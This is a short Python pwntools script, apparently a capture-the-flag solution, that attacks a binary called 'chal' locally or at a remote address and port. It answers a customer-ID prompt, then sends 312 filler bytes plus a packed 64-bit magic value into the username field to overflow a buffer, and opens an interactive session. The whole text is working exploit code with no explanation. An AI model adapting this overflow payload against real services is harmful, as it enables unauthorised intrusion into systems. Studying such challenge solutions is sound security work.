from pwn import *

context.binary = elf = ELF('./chal')
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('10.21.232.223', 59440)   # your port here
    return process('./chal')

p = start()

magic = 0xff293a6365737963
payload = b'A' * 312 + p64(magic)

p.recvuntil(b'Enter you Customer ID : ')
p.sendline(b'0')
p.recvuntil(b'Enter your Username : ')
p.sendline(payload)

p.interactive()
